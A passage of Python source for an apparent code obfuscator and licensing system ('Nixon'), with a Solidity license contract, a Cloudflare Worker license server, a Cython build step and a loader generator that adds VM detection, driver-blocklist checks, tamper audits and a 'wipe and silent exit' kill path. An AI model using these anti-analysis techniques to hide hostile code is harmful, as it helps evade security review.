    except Exception as e: results['obfuscated'] = {'status': 'ERROR', 'error': str(e)}
    if results.get('original', {}).get('status') == 'PASS' and results.get('obfuscated', {}).get('status') == 'PASS':
        orig_out = results['original']['stdout']
        obf_out = results['obfuscated']['stdout']
        orig_lines = [line.strip() for line in orig_out.splitlines() if line.strip()]
        obf_lines_raw = obf_out.splitlines()
        obf_filtered = []
        cipher_engine = "Known - Silent"
        for line in obf_lines_raw:
            stripped = line.strip()
            if not stripped: continue
            if "[INFO] AES-GCM Engine: ENABLED" in line: cipher_engine = "AES-GCM (Hardware Acceleration)"
            elif "Fallback to Nixon-XOR" in line: cipher_engine = "Nixon-XOR (Fallback Mode)"
            if any(stripped.startswith(tag) for tag in ['[DEBUG]', '[WARN]', '[INFO]', '[FAKE]', '[SUCCESS]']): continue
            obf_filtered.append(stripped)
        if orig_lines != obf_filtered:
            try:
                with open(original_source, 'r', errors='ignore') as f: orig_content = f.read()
                if "__NATIVE_BLOBS_PLACEHOLDER__" in orig_content:
                    print("    [!] Hybrid Template detected. Output mismatch expected/ignored.")
                    results['comparison'] = {'outputs_match': True, 'return_codes_match': results['original']['returncode'] == results['obfuscated']['returncode'], 'cipher_engine': cipher_engine}
                    return results
            except Exception: pass
            print("    [!] Diff Mismatch (First 3 lines):")
            import difflib
            for line in list(difflib.unified_diff(orig_lines, obf_filtered, fromfile='Original', tofile='Obfuscated', lineterm=''))[:10]:
                 print(f"      {line}")
        results['comparison'] = {'outputs_match': orig_lines == obf_filtered, 'return_codes_match': results['original']['returncode'] == results['obfuscated']['returncode'], 'cipher_engine': cipher_engine}
    return results
def test_command(args, skip_header=False):
    obfuscated_file = args.obfuscated; original_file = args.original
    if not os.path.exists(obfuscated_file) or not os.path.exists(original_file): print("[!] Files not found"); return
    if not skip_header and not getattr(args, 'silent', False):
        UI.section("PHASE 3: VERIFICATION SUITE")
    results = test_protected_file(obfuscated_file, original_file)
    orig = results.get('original', {})
    obf = results.get('obfuscated', {})
    comp = results.get('comparison', {})
    
    all_pass = (orig.get('status') == 'PASS' and obf.get('status') == 'PASS' and comp.get('outputs_match', False))
    match_str = "MATCH" if comp.get('outputs_match') else "MISMATCH"
    
    if getattr(args, 'silent', False):
         return {
             'variant': getattr(args, 'variant', 'Unknown'),
             'status': 'PASS' if all_pass else 'FAIL',
             'integrity': 'VALID', 
             'match': match_str,
             'engine': comp.get('cipher_engine', 'Unknown'),
             'raw_results': results
         }

    rows = []
    rows.append(["Original Source", orig.get('status', 'N/A'), "Valid"])
    integrity = "Match" if comp.get('outputs_match') else "Mismatch"
    rows.append(["Obfuscated Payload", obf.get('status', 'N/A'), integrity])
    UI.print_table(["TEST CASE", "STATUS", "INTEGRITY"], rows)
    UI.item("Crypto Engine", comp.get('cipher_engine', 'Unknown'), "ACTIVE")
    
    if obf.get('stderr'):
        UI._out(f"\n{UI.RED} [!] VERIFICATION STDERR:{UI.RESET}\n{obf['stderr']}")
    if not all_pass:
        UI._out(f"\n{UI.RED} [!] VERIFICATION FAILURE DETAILED:{UI.RESET}")
        UI._out(f"    Status: {obf.get('status')}")
        UI._out(f"    Return Code: {obf.get('returncode')}")
        UI._out(f"    Integrity Match: {comp.get('outputs_match')}")
        UI._out("    STDOUT (Last 20 lines):")
        out_lines = obf.get('stdout', '').splitlines()
        for l in out_lines[-20:]: UI._out(f"      {l}")
    if all_pass:
        UI._out(f"\n {UI.GREEN} [SUCCESS] ALL TESTS PASSED {UI.RESET}")
    else:
        UI.fatal("Verifiction Failed")
LICENSE_CONTRACT_SOLIDITY = '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract NixonLicense {
    address public owner;
    mapping(bytes32 => bool) public licenses;
    mapping(bytes32 => uint256) public expirations;
    event LicenseGranted(bytes32 indexed hwHash, uint256 expiration);
    event LicenseRevoked(bytes32 indexed hwHash);
    constructor() {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    function grantLicense(bytes32 hwHash, uint256 daysValid) external onlyOwner {
        licenses[hwHash] = true;
        expirations[hwHash] = block.timestamp + (daysValid * 1 days);
        emit LicenseGranted(hwHash, expirations[hwHash]);
    }
    function revokeLicense(bytes32 hwHash) external onlyOwner {
        licenses[hwHash] = false;
        expirations[hwHash] = 0;
        emit LicenseRevoked(hwHash);
    }
    function checkLicense(bytes32 hwHash) external view returns (bool) {
        if (!licenses[hwHash]) return false;
        if (expirations[hwHash] > 0 && block.timestamp > expirations[hwHash]) return false;
        return true;
    }
    function isLicensed(string calldata hwId) external view returns (bool) {
        bytes32 hwHash = keccak256(abi.encodePacked(hwId));
        return this.checkLicense(hwHash);
    }
}
'''
def compile_solidity(source_code, contract_name="NixonLicense"):
    try:
        import solcx
        try:
            solcx.install_solc('0.8.20')
        except Exception: pass
        solcx.set_solc_version('0.8.20')
        compiled = solcx.compile_source(
            source_code,
            output_values=['abi', 'bin'],
            solc_version='0.8.20'
        )
        contract_key = f'<stdin>:{contract_name}'
        if contract_key not in compiled:
            contract_key = list(compiled.keys())[0]
        return {
            'abi': compiled[contract_key]['abi'],
            'bytecode': compiled[contract_key]['bin'],
            'compiler_version': 'v0.8.20+commit.a1b79de6'
        }
    except ImportError:
        print("    [!] py-solc-x not installed. Run: pip install py-solc-x")
        return None
    except Exception as e:
        print(f"    [!] Solidity compilation failed: {e}")
        return None
def deploy_contract(rpc_url, private_key, bytecode, abi):
    try:
        from web3 import Web3
        w3 = Web3(Web3.HTTPProvider(rpc_url))
        if not w3.is_connected():
            print(f"    [!] Cannot connect to {rpc_url}")
            return None
        account = w3.eth.account.from_key(private_key)
        Contract = w3.eth.contract(abi=abi, bytecode=bytecode)
        tx = Contract.constructor().build_transaction({
            'from': account.address,
            'nonce': w3.eth.get_transaction_count(account.address),
            'gas': 3000000,
            'gasPrice': 0,
            'chainId': w3.eth.chain_id
        })
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        print(f"    [+] Transaction sent: {tx_hash.hex()}")
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
        if receipt['status'] == 1:
            print(f"    [+] Contract deployed at: {receipt['contractAddress']}")
            return receipt['contractAddress']
        else:
            print("    [!] Deployment failed")
            return None
    except ImportError:
        print("    [!] web3 not installed. Run: pip install web3")
        return None
    except Exception as e:
        print(f"    [!] Deployment error: {e}")
        return None
def verify_on_blockscout(explorer_url, contract_address, source_code, compiler_version, contract_name="NixonLicense"):
    try:
        import urllib.request
        import urllib.parse
        api_url = f"{explorer_url.rstrip('/')}/api"
        params = {
            'module': 'contract',
            'action': 'verify',
            'addressHash': contract_address,
            'name': contract_name,
            'compilerVersion': compiler_version,
            'optimization': 'false',
            'contractSourceCode': source_code
        }
        data = urllib.parse.urlencode(params).encode()
        req = urllib.request.Request(api_url, data=data)
        resp = urllib.request.urlopen(req, timeout=30)
        try:
            result = json.loads(resp.read())
            if not isinstance(result, dict): return False
        except Exception: return False
        if result.get('status') == '1' or result.get('message') == 'OK':
            print("    [+] Contract verified on explorer")
            return True
        else:
            print(f"    [!] Verification response: {result}")
            return False
    except Exception as e:
        print(f"    [!] Verification error: {e}")
        return False
def auto_deploy_contract(rpc_url, explorer_url=None, private_key=None):
    print("\n[AUTO-DEPLOY] Starting blockchain deployment pipeline...")
    if not private_key:
        print("    [!] WARNING: No private key provided.")
        print("    [!] Generating a random throwaway wallet for this deployment...")
        private_key = "0x" + secrets.token_hex(32)
        print(f"    [+] Generated Key: {private_key}")
        print("    [!] SAVE THIS KEY NOW. You will need it to manage the contract.")
    print("    [1/3] Compiling Solidity...")
    compiled = compile_solidity(LICENSE_CONTRACT_SOLIDITY)
    if not compiled:
        return None, None
    print(f"    [+] Compiled. Bytecode size: {len(compiled['bytecode'])} bytes")
    print("    [2/3] Deploying to chain...")
    contract_address = deploy_contract(rpc_url, private_key, compiled['bytecode'], compiled['abi'])
    if not contract_address:
        return None, None
    if explorer_url:
        print("    [3/3] Verifying on Blockscout...")
        verify_on_blockscout(explorer_url, contract_address, LICENSE_CONTRACT_SOLIDITY, compiled['compiler_version'])
    else:
        print("    [3/3] Skipping verification (no explorer URL)")
    print("\n[AUTO-DEPLOY] SUCCESS!")
    print(f"    Contract: {contract_address}")
    print(f"    RPC: {rpc_url}")
    return contract_address, rpc_url
PHANTOM_NODE_JS = r"""
export default {
  async fetch(request, env) {
    if (request.method !== "POST") return new Response("Not Found", { status: 404 });
    try {
      const raw = await request.arrayBuffer();
      const dec = new TextDecoder();
      const enc = new TextEncoder();
      const data = new Uint8Array(raw);
      const ntruLen = (data[0] << 8) | data[1];
      const ntruBlob = data.slice(2, 2 + ntruLen);
      const iv = data.slice(2 + ntruLen, 2 + ntruLen + 12); 
      const encryptedPayload = data.slice(2 + ntruLen + 12);
      const privKey = JSON.parse(env.NTRU_PRIV);
      const N = 509; const Q = 2048;
      let c_poly = [];
      for(let i=0; i<ntruBlob.length/2; i++) {
          c_poly.push((ntruBlob[i*2] << 8) | ntruBlob[i*2+1]);
      }
      let a_poly = new Array(N).fill(0);
      for(let i=0; i<N; i++) {
        if(privKey[i] === 0) continue;
        for(let j=0; j<N; j++) {
            let idx = (i + j) % N;
            let term = (c_poly[j] * privKey[i]) % Q;
            a_poly[idx] = (a_poly[idx] + term) % Q;
        }
      }
      let recoveredBits = "";
      for(let i=0; i<N; i++) {
          let val = a_poly[i];
          if (val > Q/2) val = val - Q;
          recoveredBits += (Math.abs(val) < Q/4) ? "0" : "1";
      }
      let sessionBytes = [];
      for(let i=0; i<recoveredBits.length; i+=8) {
          sessionBytes.push(parseInt(recoveredBits.substr(i, 8).split("").reverse().join(""), 2));
      }
      const sessionToken = new Uint8Array(sessionBytes.slice(0, 32));
      let decryptedBuffer;
      try {
          const cryptoKey = await crypto.subtle.importKey(
              "raw", sessionToken, {name: "AES-GCM"}, false, ["decrypt"]
          );
          decryptedBuffer = await crypto.subtle.decrypt(
              {name: "AES-GCM", iv: iv}, cryptoKey, encryptedPayload
          );
      } catch (aesError) {
          const seedInput = new Uint8Array(sessionToken.length + iv.length);
          seedInput.set(sessionToken);
          seedInput.set(iv, sessionToken.length);
          let k_h = new Uint8Array(await crypto.subtle.digest("SHA-256", seedInput));
          decryptedBuffer = new Uint8Array(encryptedPayload.length);
          for (let i = 0; i < encryptedPayload.length; i++) {
              if (i > 0 && i % 32 === 0) {
                  const rekeyInput = new Uint8Array(k_h.length + i.toString().length);
                  rekeyInput.set(k_h);
                  rekeyInput.set(enc.encode(i.toString()), k_h.length);
                  k_h = new Uint8Array(await crypto.subtle.digest("SHA-256", rekeyInput));
              }
              decryptedBuffer[i] = encryptedPayload[i] ^ k_h[i % 32];
          }
      }
      const jsonStr = dec.decode(decryptedBuffer);
      let validBody = null;
      try { validBody = JSON.parse(jsonStr); } 
      catch(e) { return new Response("Invalid JSON", {status: 403}); }
      const hwid = validBody.hw || validBody.data; 
      const secretHashBuffer = await crypto.subtle.digest("SHA-256", enc.encode(hwid));
      const secretHashHex = Array.from(new Uint8Array(secretHashBuffer))
          .map(b => b.toString(16).padStart(2, '0')).join('');
      const finalKey = await env.LICENSES.get(secretHashHex);
      if (finalKey) {
          const respIv = crypto.getRandomValues(new Uint8Array(12));
          const respKey = await crypto.subtle.importKey(
              "raw", sessionToken, {name: "AES-GCM"}, false, ["encrypt"]
          );
          const encKey = await crypto.subtle.encrypt(
              {name: "AES-GCM", iv: respIv}, respKey, enc.encode(finalKey)
          );
          const finalResp = new Uint8Array(12 + encKey.byteLength);
          finalResp.set(respIv);
          finalResp.set(new Uint8Array(encKey), 12);
          return new Response(finalResp, {headers: {"Content-Type": "application/octet-stream"}});
      }
      return new Response("Invalid License", {status: 403});
    } catch(e) { return new Response(e.toString(), {status: 500}); }
  }
};
"""
class CloudflareDeployer:
    def __init__(self, api_token, account_id):
        self.api_token = api_token
        self.account_id = account_id
        self.headers = {"Authorization": f"Bearer {api_token}", "Content-Type": "application/json"}
        self.base_url = "https://api.cloudflare.com/client/v4"
        self.worker_name = "nixon-master-node"
        self.kv_name = "NIXON_LICENSES"
    def _req(self, method, endpoint, data=None):
        import urllib.request
        for attempt in range(3):
            try:
                url = f"{self.base_url}/accounts/{self.account_id}/{endpoint}"
                body = json.dumps(data).encode() if data else None
                req = urllib.request.Request(url, data=body, headers=self.headers, method=method)
                with urllib.request.urlopen(req, timeout=15) as r:
                    try:
                        res = json.loads(r.read())
                        return res if isinstance(res, dict) else None
                    except Exception: return None
            except Exception:
                time.sleep(2)
        return None
    def get_subdomain(self):
        res = self._req("GET", "workers/subdomain")
        return res['result']['subdomain'] if res and res.get('success') else None
    def get_kv_id(self):
        res = self._req("GET", "storage/kv/namespaces")
        if res and res.get('success'):
            for ns in res['result']:
                if ns['title'] == self.kv_name: return ns['id']
        with UI.Task("Cloudflare KV", f"Creating {self.kv_name}...") as t:
            res = self._req("POST", "storage/kv/namespaces", {"title": self.kv_name})
            if res and res.get('success'):
                t.success()
                return res['result']['id']
            t.fail()
            return None
    def add_license(self, hwid_hash, encrypted_bytecode, note="Authorized"):
        kv_id = self.get_kv_id()
        if not kv_id: return False
        with UI.Task("License Auth", f"Authorizing {hwid_hash[:8]}...") as t:
            import urllib.request
            url = f"{self.base_url}/accounts/{self.account_id}/storage/kv/namespaces/{kv_id}/values/{hwid_hash}"
            req = urllib.request.Request(url, data=encrypted_bytecode.encode() if isinstance(encrypted_bytecode, str) else encrypted_bytecode, headers={"Authorization": f"Bearer {self.api_token}", "Content-Type": "text/plain"}, method='PUT')
            try:
                urllib.request.urlopen(req, timeout=10)
                t.success(f"Authorized {hwid_hash[:8]}")
                return True
            except Exception as e:
                t.fail(str(e))
                return False
    def deploy_master(self, hmac_key, auth_mode="HWID", auth_hash=None, ntru_priv=None):
        kv_id=self.get_kv_id()
        if not kv_id:return None
        import urllib.request
        worker_js=r"""
export default {
  async fetch(request, env) {
    if (request.method !== "POST") return new Response("Not Found", { status: 404 });
    try {
      const raw = await request.arrayBuffer();
      const dec = new TextDecoder();
      const enc = new TextEncoder();
      const data = new Uint8Array(raw);
      const ntruLen = (data[0] << 8) | data[1];
      const ntruBlob = data.slice(2, 2 + ntruLen);
      const aesIv = data.slice(2 + ntruLen, 2 + ntruLen + 12);
      const aesBlob = data.slice(2 + ntruLen + 12);
      const privKey = JSON.parse(env.NTRU_PRIV);
      const N = 509; const Q = 2048;
      if (env.LICENSES) {
          const ip = request.headers.get("CF-Connecting-IP") || "unknown";
          const rateKey = `rate_${ip.replace(/[^a-f0-9:]/g, "")}`;
          const current = await env.LICENSES.get(rateKey);
          if (current && parseInt(current) > 50) return new Response("Rate Limit", {status: 429});
          await env.LICENSES.put(rateKey, (parseInt(current)||0)+1, {expirationTtl: 60});
      }
      let c_poly = [];
      for(let i=0; i<ntruBlob.length/2; i++) {
          c_poly.push((ntruBlob[i*2] << 8) | ntruBlob[i*2+1]);
      }
      let a_poly = new Array(N).fill(0);
      for(let i=0; i<N; i++) {
        if(privKey[i] === 0) continue;
        for(let j=0; j<N; j++) {
            let idx = (i + j) % N;
            let coeff = privKey[i];
            let term = (c_poly[j] * coeff) % Q;
            a_poly[idx] = (a_poly[idx] + term) % Q;
        }
      }
      let recoveredBits = "";
      for(let i=0; i<N; i++) {
          let val = a_poly[i];
          if (val > Q/2) val = val - Q;
          recoveredBits += (Math.abs(val) < Q/4) ? "0" : "1";
      }
      let sessionBytes = [];
      for(let i=0; i<recoveredBits.length; i+=8) {
          sessionBytes.push(parseInt(recoveredBits.substr(i, 8).split("").reverse().join(""), 2));
      }
      const sessionToken = new Uint8Array(sessionBytes.slice(0, 32));
      const cryptoKey = await crypto.subtle.importKey("raw", sessionToken, {name: "AES-GCM"}, false, ["decrypt"]);
      const decryptedBuffer = await crypto.subtle.decrypt({name: "AES-GCM", iv: aesIv}, cryptoKey, aesBlob);
      const secretCode = dec.decode(decryptedBuffer);
      const secretHashBuffer = await crypto.subtle.digest("SHA-256", enc.encode(secretCode));
      const secretHashArr = Array.from(new Uint8Array(secretHashBuffer));
      const secretHashHex = secretHashArr.map(b => b.toString(16).padStart(2, '0')).join('');
      const finalKey = await env.LICENSES.get(secretHashHex);
      if (finalKey) {
          const respIv = crypto.getRandomValues(new Uint8Array(12));
          const respKey = await crypto.subtle.importKey("raw", sessionToken, {name: "AES-GCM"}, false, ["encrypt"]);
          const encKey = await crypto.subtle.encrypt({name: "AES-GCM", iv: respIv}, respKey, enc.encode(finalKey));
          const finalResp = new Uint8Array(12 + encKey.byteLength);
          finalResp.set(respIv);
          finalResp.set(new Uint8Array(encKey), 12);
          return new Response(finalResp, {headers: {"Content-Type": "application/octet-stream"}});
      }
      return new Response("Invalid", {status: 403});
    } catch(e) { return new Response(e.toString(), {status: 500}); }
  }
};
"""
        bindings=[{"type":"kv_namespace","name":"LICENSES","namespace_id":kv_id},{"type":"plain_text","name":"SECRET_KEY","text":hmac_key},{"type":"plain_text","name":"NTRU_PRIV","text":json.dumps(ntru_priv)if ntru_priv else"[]"}]
        metadata={"main_module":"worker.js","compatibility_date":"2023-10-25","bindings":bindings}
        boundary=f"----WebKitFormBoundary{secrets.token_hex(8)}"
        body=f'--{boundary}\r\nContent-Disposition: form-data; name="metadata"\r\nContent-Type: application/json\r\n\r\n{json.dumps(metadata)}\r\n--{boundary}\r\nContent-Disposition: form-data; name="worker.js"; filename="worker.js"\r\nContent-Type: application/javascript+module\r\n\r\n{worker_js}\r\n--{boundary}--\r\n'
        url=f"{self.base_url}/accounts/{self.account_id}/workers/scripts/{self.worker_name}"
        req=urllib.request.Request(url,data=body.encode(),method='PUT')
        req.add_header("Authorization",f"Bearer {self.api_token}")
        req.add_header("Content-Type",f"multipart/form-data; boundary={boundary}")
        try:
            urllib.request.urlopen(req,timeout=30)
            sub=self._req("GET","workers/subdomain")
            if sub:
                 subd=sub['result']['subdomain']
                 return f"https://{self.worker_name}.{subd}.workers.dev"
        except Exception:pass
        return None
    def cleanup(self):
        UI.warn("Deleting Master Node...")
        self._req("DELETE", f"workers/scripts/{self.worker_name}")
        kv_id = self.get_kv_id()
        if kv_id:
            UI.warn("Deleting License Database...")
            self._req("DELETE", f"storage/kv/namespaces/{kv_id}")
        print("    [+] Cleanup Complete.")
def prepare_obfuscated_source(source_path, ast_opts=None):
    if ast_opts is None: ast_opts = {}
    with open(source_path, 'r', encoding='utf-8') as f:
        source_code = f.read()
    # Phase-4 wiring: build-time macro expansion (no-op when no macros
    # present; never breaks existing callers — all keys via .get()).
    try:
        from obfuscator.macros import collect_macros as _collect_macros, apply_macros as _apply_macros
        _hwid = str(ast_opts.get('hwid', '') or '')
        if _collect_macros(source_code):
            source_code = _apply_macros(source_code, hwid=_hwid)
    except Exception:
        pass
    # V10 name gate (opt-in): privileged call sites resolve through a
    # per-build token map instead of appearing as literals.
    try:
        if ast_opts.get('name_gate', False):
            from obfuscator.name_gate import (
                build_mapping as _ng_build,
                emit_gate_snippet as _ng_emit,
                rewrite_calls as _ng_rewrite,
            )
            import os as _ng_os
            _ng_seed = str(ast_opts.get('build_id', '') or '').encode() or _ng_os.urandom(16)
            _ng_map = _ng_build(_ng_seed)
            source_code = _ng_emit(_ng_map) + _ng_rewrite(source_code, _ng_map)
    except Exception:
        pass
    # V10 semantic lowering (opt-in via --lowering CSV): rewrite covered
    # call sites to _nxk_* kernel calls + prepend the shim import. The
    # --pytoc path later swaps the shim import for the native kernel
    # module (same call shapes, per-build renamed impl symbols).
    try:
        _low_spec = str(ast_opts.get('lowering', '') or '')
        if _low_spec:
            from obfuscator.lowering import (
                emit_shim_import as _low_import,
                lower_source as _low_src,
                resolve_families as _low_resolve,
            )
            _low_active = _low_resolve(_low_spec)
            if _low_active:
                _low_body, _low_n = _low_src(source_code, _low_active)
                _low_imp = _low_import(_low_active)
                if _low_n:
                    source_code = (_low_imp + _low_body) if _low_imp else _low_body
    except Exception:
        pass
    print("    [+] Pre-obfuscating source for native build...")
    protected_code, _ = apply_ast_mutation(source_code, options=ast_opts)
    return protected_code
def build_local_cython(source_content, target_python=None):
    import tempfile
    import subprocess
    import sys
    import shutil
    from setuptools import setup, Extension  # noqa: F401 (this line binds a name used by an embedded template)
    from Cython.Build import cythonize  # noqa: F401 (this line binds a name used by an embedded template)
    build_dir = tempfile.mkdtemp(prefix="nixon_local_build_")
    try:
        src_path = os.path.join(build_dir, "payload.py")
        source_content = source_content.replace('if __name__ == "__main__":', 'if True:')
        with open(src_path, "w", encoding="utf-8") as f:
            f.write(source_content)
        print(f"    [>] Local Build Directory: {build_dir}")
        setup_content = """
from setuptools import setup, Extension
from Cython.Build import cythonize
setup(
    ext_modules=cythonize("payload.py", compiler_directives={'language_level': "3", 'always_allow_keywords': True}),
    script_args=["build_ext", "--inplace"]
)
"""
        setup_path = os.path.join(build_dir, "setup.py")
        with open(setup_path, "w", encoding="utf-8") as f:
            f.write(setup_content)            
        python_exec = target_python if target_python else sys.executable
        cmd = [python_exec, "setup.py", "build_ext", "--inplace"]
        result = subprocess.run(cmd, cwd=build_dir, capture_output=True, text=True)
        if result.returncode != 0:
            print(f" [!] Local Build Error Details:\n{result.stderr}")
            if result.stdout:
                print(f" [!] Local Build Stdout:\n{result.stdout}")
            return None, None            
        built_file = None
        for f in os.listdir(build_dir):
            if f.startswith("payload") and not f.endswith(".py") and not f.endswith(".c"):
                built_file = os.path.join(build_dir, f)
                break
        if built_file:
            print(f"    [+] Local compilation success: {os.path.basename(built_file)}")
            with open(built_file, "rb") as f:
                return f.read(), os.path.basename(built_file)
        else:
            print("    [!] Compilation failed: No binary found.")
            return None, None
    except Exception as e:
        print(f"    [!] Local Build Error: {e}")
        return None, None
    finally:
        try: shutil.rmtree(build_dir, ignore_errors=True)
        except Exception: pass
def generate_hybrid_loader_script(native_blobs, bytecode_fallback, key_hex, native_only=False,
                                   hwid='', trial_seconds=None, vm_threshold=50.0,
                                   kod=False, hostguard=False, hwid_lock=False,
                                   build_id=None, watermark=None,
                                   watermark_key=None, driver_check=False,
                                   split_bootstrap=False, snapshot_off=False,
                                   stdlib_audit_off=False,
                                   section_split=False, section_count=4,
                                   customer_salt="", licence_bound=False):
    # Phase-4 wiring: all new kwargs default to current behavior (no change
    # when absent). vm/secure-temp snippets are always appended (report-only,
    # safe); hostguard only when requested (changes exec semantics).
    try:
        _vm_thr = float(vm_threshold)
    except Exception:
        _vm_thr = 50.0
    _phase4_prefix = ""
    if hostguard:
        try:
            from obfuscator.hostguard import emit_hostguard_snippet as _emit_hg
            _phase4_prefix = _emit_hg() + "\n"
        except Exception:
            _phase4_prefix = ""
    _phase4_suffix = ""
    try:
        from obfuscator.secure_temp import emit_loader_snippet as _emit_st
        _phase4_suffix += _emit_st() + "\n"
    except Exception:
        pass
    try:
        from obfuscator.vm_score import emit_loader_snippet as _emit_vm
        _phase4_suffix += _emit_vm(_vm_thr, bool(kod)) + "\n"
        # The VM snippet defines vm_check()/vm_score_percent() (KOD-gated
        # kill inside vm_check). Invoke once at loader import so a VM host
        # is caught at startup, not only when something calls vm_check().
        # KOD default-OFF (report-only) keeps this safe: disarmed, the
        # call computes the verdict and returns without exiting.
        _phase4_suffix += (
            "try:\n"
            "    vm_check()\n"
            "except SystemExit:\n"
            "    raise\n"
            "except Exception:\n"
            "    pass\n"
        )
    except Exception:
        pass
    # V10 kernel-driver gate (SAFE read-only defensive gate: enumeration +
    # blocklist comparison only; no driver loading, no ring-0). Opt-in via
    # driver_check=True (--driver-check) which bakes the snippet + sets the
    # _NX_DRIVER_CHECK_ARMED marker; runtime env NIXON_DRIVER_CHECK=1 also
    # arms. Disarmed: enumerate + return hits, never exit, no thread.
    try:
        from obfuscator.driver_blocklist import emit_driver_snippet as _emit_drv
        _phase4_suffix += _emit_drv(bool(driver_check)) + "\n"
    except Exception:
        pass
    try:
        _phase4_suffix += ("_NX_DRIVER_CHECK_ARMED = %r\n" % (bool(driver_check),))
    except Exception:
        pass
    # NOTE: _NX_DRIVER_CHECK_ARMED is an informational / reserved build-
    # manifest literal (golden tests assert its bytes). It is NOT read at
    # runtime: the live driver gate reads env NIXON_DRIVER_CHECK (see the
    # emitted driver snippet).
    # V10 split-bootstrap (opt-in, default OFF): Shamir threshold key +
    # fragmented decoder (obfuscator/split_bootstrap.py). Best-effort:
    # never break builds — any failure falls back to the single-key path.
    # Modeled on the --driver-check plumbing (marker + snippet suffix).
    # NOTE: the split path salts with the per-build build_id, so build_id
    # must be minted BEFORE splitting (the canonical mint lives below;
    # duplicate it here — same os.urandom/uuid fallback chain — so the
    # salt baked into the SB snippet always equals the emitted
    # _NX_BUILD_ID. Un-minted here, the snippet would salt with "None").
    if build_id is None:
        try:
            build_id = os.urandom(8).hex()
        except Exception:
            build_id = uuid.uuid4().hex[:16]
    build_id = str(build_id)
    _split_bootstrap_on = False
    try:
        _split_bootstrap_on = bool(split_bootstrap)
    except Exception:
        _split_bootstrap_on = False
    try:
        _phase4_suffix += ("_NX_SPLIT_BOOTSTRAP = %r\n" % (_split_bootstrap_on,))
    except Exception:
        pass
    if _split_bootstrap_on:
        try:
            from obfuscator.split_bootstrap import (
                emit_bootstrap_snippet as _sb_emit,
                split_bootstrap_key as _sb_split,
            )
            _sb_key = bytes.fromhex(key_hex)
            _sb_out = _sb_split(_sb_key)
            _phase4_suffix += _sb_emit(_sb_out["fragments"],
                                       _sb_out["k"], str(build_id)) + "\n"
            _phase4_suffix += (
                "_NX_SPLIT_BOOTSTRAP_ARMED = True\n"
                "try:\n"
                "    BLOB_KEY_SB = _nx_sb_activate()\n"
                "except Exception:\n"
                "    BLOB_KEY_SB = None\n"
                "if BLOB_KEY_SB is not None:\n"
                "    _NX_EFF_KEY = BLOB_KEY_SB\n"
            )
        except Exception:
            try:
                _phase4_suffix += "_NX_SPLIT_BOOTSTRAP_ARMED = False\n"
            except Exception:
                pass
    else:
        try:
            _phase4_suffix += "_NX_SPLIT_BOOTSTRAP_ARMED = False\n"
        except Exception:
            pass
    _phase4_suffix += ("_NX_KOD_ARMED = %r\n" % (bool(kod),))
    _phase4_suffix += ("_NX_TRIAL_SECONDS = %r\n" % (trial_seconds,))
    # NOTE: _NX_KOD_ARMED / _NX_TRIAL_SECONDS above are informational /
    # reserved build-manifest literals (golden tests assert their bytes).
    # They are NOT read at runtime: the live KOD switch is env NIXON_KOD
    # (see vm_score snippet) and the live trial gate is the emitted
    # _nx_trial_gate snippet + _NX_TRIAL_* literals below.
    # Runtime integrity: frozen stdlib file snapshots. Default ON unless
    # snapshot_off=True (--no-snapshot); runtime env NIXON_SNAPSHOT_OFF
    # also disables. Version-bound: enforced only when the target
    # interpreter tag matches the build tag, else DISABLED/report-only.
    try:
        _snapshot_on = not bool(snapshot_off)
    except Exception:
        _snapshot_on = True
    if _snapshot_on:
        try:
            from obfuscator.frozen_snapshot import (
                build_snapshot_context as _ss_ctx,
                emit_snapshot_snippet as _ss_emit,
            )
            _ss_build = _ss_ctx()
            _ss_files = dict(_ss_build.get("files", {}))
            _ss_tag = str(_ss_build.get("tag", ""))
            _phase4_suffix += ("_NX_SNAPSHOT_TAG = %r\n" % (_ss_tag,))
            _phase4_suffix += ("_NX_SNAPSHOT_FILES = %r\n" % (_ss_files,))
            if _ss_files and _ss_tag:
                _phase4_suffix += _ss_emit(_ss_files, _ss_tag) + "\n"
                _phase4_suffix += (
                    "_NX_SNAPSHOT_GATE = _nx_snapshot_gate()\n"
                    "if _NX_SNAPSHOT_GATE == \"mismatch\":\n"
                    "    _nx_kill(\"integrity-snapshot\")\n"
                )
            else:
                _phase4_suffix += "_NX_SNAPSHOT_GATE = \"DISABLED\"\n"
        except SystemExit:
            raise
        except Exception:
            try:
                _phase4_suffix += "_NX_SNAPSHOT_GATE = \"DISABLED\"\n"
            except Exception:
                pass
    else:
        try:
            _phase4_suffix += "_NX_SNAPSHOT_GATE = \"DISABLED\"\n"
        except Exception:
            pass
    # Runtime integrity: stdlib function audit (bytecode compare).
    # Default ON unless stdlib_audit_off=True (--no-stdlib-audit);
    # runtime env NIXON_STDLIB_AUDIT_OFF also disables. Same
    # version-binding as snapshots: mismatch -> DISABLED/report-only.
    try:
        _stdlib_on = not bool(stdlib_audit_off)
    except Exception:
        _stdlib_on = True
    if _stdlib_on:
        try:
            from obfuscator.stdlib_audit import (
                build_audit_context as _sa_ctx,
                emit_audit_snippet as _sa_emit,
            )
            _sa_build = _sa_ctx()
            _sa_runtime = dict(_sa_build.get("runtime", {}))
            _sa_tag = str(_sa_build.get("tag", ""))
            _phase4_suffix += ("_NX_STDLIB_TAG = %r\n" % (_sa_tag,))
            _phase4_suffix += ("_NX_STDLIB_FUNCS = %r\n" % (_sa_runtime,))
            if _sa_runtime and _sa_tag:
                _phase4_suffix += _sa_emit(_sa_runtime, _sa_tag) + "\n"
                _phase4_suffix += (
                    "_NX_STDLIB_GATE = _nx_stdlib_gate()\n"
                    "if _NX_STDLIB_GATE == \"mismatch\":\n"
                    "    _nx_kill(\"stdlib-tamper\")\n"
                )
            else:
                _phase4_suffix += "_NX_STDLIB_GATE = \"DISABLED\"\n"
        except SystemExit:
            raise
        except Exception:
            try:
                _phase4_suffix += "_NX_STDLIB_GATE = \"DISABLED\"\n"
            except Exception:
                pass
    else:
        try:
            _phase4_suffix += "_NX_STDLIB_GATE = \"DISABLED\"\n"
        except Exception:
            pass
    # Kill ladder (V10 single failure path): every enforcement gate in the
    # emitted loader funnels through _nx_kill (wipe + silent exit 137).
    # Emitted ONCE, AFTER the integrity gates above (they call _nx_kill)
    # and BEFORE the trial/watermark gates below; best-effort so a ladder
    # import failure can never break builds.
    try:
        from obfuscator.kill_ladder import emit_kill_snippet as _kl_emit
